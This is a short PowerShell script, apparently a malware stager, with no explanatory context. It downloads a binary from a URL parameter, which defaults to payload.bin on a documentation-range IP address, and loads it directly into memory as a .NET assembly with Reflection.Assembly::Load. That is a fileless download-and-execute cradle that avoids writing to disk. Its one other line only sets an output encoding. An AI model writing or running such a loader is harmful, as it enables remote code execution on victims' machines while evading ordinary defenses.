
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://192.0.2.203:443/payload.bin'
)
$PayloadBytes = (New-Object System.Net.WebClient).DownloadData($TransferUrl)
[Reflection.Assembly]::Load($PayloadBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
